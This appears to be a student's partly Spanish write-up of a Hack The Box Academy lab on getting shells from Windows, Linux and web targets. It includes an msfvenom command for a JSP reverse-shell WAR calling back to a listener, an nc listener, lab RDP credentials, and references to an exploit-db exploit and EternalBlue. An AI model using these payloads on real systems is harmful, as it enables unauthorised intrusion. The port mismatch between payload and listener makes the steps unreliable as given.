## Guión
El equipo de CAT5 nos ha asegurado un punto de apoyo en la red de Inlanefrieght. Nuestra responsabilidad es examinar los resultados del reconocimiento que se ejecutó, validar cualquier información que consideremos necesaria, investigar lo que se puede ver y elegir qué exploits, cargas útiles y proyectiles se utilizarán para controlar los objetivos. Una vez en la VPN o desde tu `Pwnbox`, necesitaremos `RDP`en el host de punto de apoyo y realice las acciones necesarias desde allí. A continuación encontrará las credenciales, direcciones IP y otra información que pueda ser necesaria.

## Objetivos:
- Demuestre sus conocimientos sobre cómo explotar y recibir un shell interactivo desde un `Windows host or server`.
- Demuestre sus conocimientos sobre cómo explotar y recibir un shell interactivo desde un `Linux host or server`.
- Demuestre sus conocimientos sobre cómo explotar y recibir un shell interactivo desde un `Web application`.
- Demuestra tu capacidad para identificar los `shell environment` al que tiene acceso como usuario en el host de la víctima.

## Credentials and Other Needed Info:
- IP:
- Credentials: `htb-student` / HTB_@cademy_stdnt! Can be used by RDP.
## Conectividad al punto de apoyo
```js
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

#### Target Hosts
![](https://academy.hackthebox.com/storage/modules/115/challenge-map.png)

Los anfitriones 1 a 3 serán tus objetivos para este desafío de habilidades. Cada host tiene un vector único para atacar e incluso puede tener más de una ruta incorporada. Las preguntas de desafío a continuación se pueden responder explotando estos tres hosts. Obtenga acceso y enumere estos objetivos. Necesitará utilizar la PC Foothold proporcionada. La IP aparecerá cuando generes los objetivos. Intentar interactuar con los objetivos desde cualquier lugar que no sea el punto de apoyo no funcionará. Tenga en cuenta que el host de Foothold tiene acceso a la red interna de carga interna ( 172.16.1.0/23 red) por lo que es posible que desees prestar especial atención a la dirección IP que elijas al iniciar tus oyentes. 

## Connect 

```js
xfreerdp /v:10.129.158.29 /u:htb-student /p:HTB_@cademy_stdnt!
```

![[2024-06-22_09-26.png]]

- 172.16.1.11 (VICTIM IP)
- 172.16.1.5 (My IP)

![[2024-06-22_10-50.png]]

![[2024-06-22_10-55.png]]

![[2024-06-23_03-30.png]]

```js
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4646 -f war > shell.war
```

![[2024-06-23_03-32.png]]

In my Kali
```js
nc -lvnp 2121
```

Click in /shell and activate the Payload.

--------

http://blog.inlanefreight.local
![[2024-06-23_09-03.png]]

![[2024-06-23_09-51.png]]

https://www.exploit-db.com/exploits/50064

If dont fidthe exploit in msfconsole, use `reload_all`

-----------------------

- 172.16.1.13
![[2024-06-23_10-53.png]]

![[2024-06-23_10-54.png]]

Exploit a EternalBLue with metasploit